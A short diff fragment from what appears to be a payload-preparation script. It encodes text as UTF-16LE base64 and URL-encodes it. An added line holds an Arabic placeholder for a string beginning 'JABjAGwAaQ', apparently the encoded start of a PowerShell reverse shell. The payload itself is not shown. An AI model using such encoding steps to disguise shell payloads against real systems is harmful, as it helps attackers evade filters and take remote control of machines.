@@ -52,6 +52,8 @@ import base64
 
 python3 -c "import urllib.parse; print(urllib.parse.quote('PASTE_BASE64_HERE'))"
 
+python3 -c 'import urllib.parse; print(urllib.parse.quote("ضع_هنا_النص_الطويل_الذي_يبدأ_بـ_JABjAGwAaQ"))'
+
 print(base64.b64encode(payload.encode("utf-16le")).decode())
 PY
 
